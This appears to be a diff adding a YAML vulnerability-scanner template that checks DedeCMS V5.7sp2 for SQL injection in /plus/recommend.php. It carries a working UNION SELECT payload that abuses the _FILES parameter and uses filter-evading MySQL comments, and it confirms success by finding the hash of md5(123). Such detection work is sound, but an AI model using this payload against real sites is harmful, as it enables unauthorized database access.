@@ -1,0 +1,19 @@
+name: DedeCMS V5.7sp2-sqli
+rules:
+  - method: GET
+    path: /plus/recommend.php
+    headers:
+      User-Agent: ''
+    body: |-
+      action=&aid=1&_FILES[type][tmp_name]=\'
+        or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,md5(123),5,6,7,8,9%23@`\'`+&_FILES[type][name]=1.jpg&_FILES[type]
+       [type]=application/octet-stream&_FILES[type][size]=111
+    follow_redirects: true
+    expression: |+
+
+    search: >-
+      response.status==200&&response.body.bcontains(b"202cb962ac59075b964b07152d234b70")
+detail:
+  author: durkworf
+  links:
+    - https://cloud.tencent.com/developer/article/1035082
